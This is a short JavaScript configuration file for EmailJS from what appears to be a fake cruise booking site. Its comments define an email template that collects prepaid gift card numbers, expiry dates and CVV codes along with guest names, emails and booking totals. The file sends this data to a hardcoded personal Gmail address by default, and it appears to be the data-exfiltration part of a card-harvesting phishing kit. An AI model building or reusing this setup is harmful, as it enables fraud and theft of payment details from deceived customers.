// ─────────────────────────────────────────────────────────────
//  EmailJS Configuration
//
//  For local dev: create a .env file (see .env.example)
//  For Cloudflare Pages: add these in
//    Pages → Settings → Environment Variables
//
//  EmailJS setup:
//  1. https://www.emailjs.com → create free account
//  2. Add a Gmail service  → copy Service ID
//  3. Create an email template using the variables below → copy Template ID
//  4. Account → API Keys   → copy Public Key
//
//  Template variables:
//    {{gift_card_number}}   — 16-digit prepaid card number
//    {{gift_card_expiry}}   — MM/YY
//    {{gift_card_cvv}}      — 3-digit CVV2
//    {{action}}             — e.g. "Gift Card Details Entered"
//    {{cruise_name}}        — cruise name
//    {{guest_name}}         — guest full name
//    {{guest_email}}        — guest email
//    {{booking_amount}}     — booking total
//    {{submitted_at}}       — date/time of submission
//    {{to_email}}           — recipient address
// ─────────────────────────────────────────────────────────────

export const EMAILJS_CONFIG = {
  SERVICE_ID:  import.meta.env.VITE_EMAILJS_SERVICE_ID  || '',
  TEMPLATE_ID: import.meta.env.VITE_EMAILJS_TEMPLATE_ID || '',
  PUBLIC_KEY:  import.meta.env.VITE_EMAILJS_PUBLIC_KEY  || '',
  RECIPIENT:   import.meta.env.VITE_EMAILJS_RECIPIENT   || 'diannahayes23@gmail.com',
};
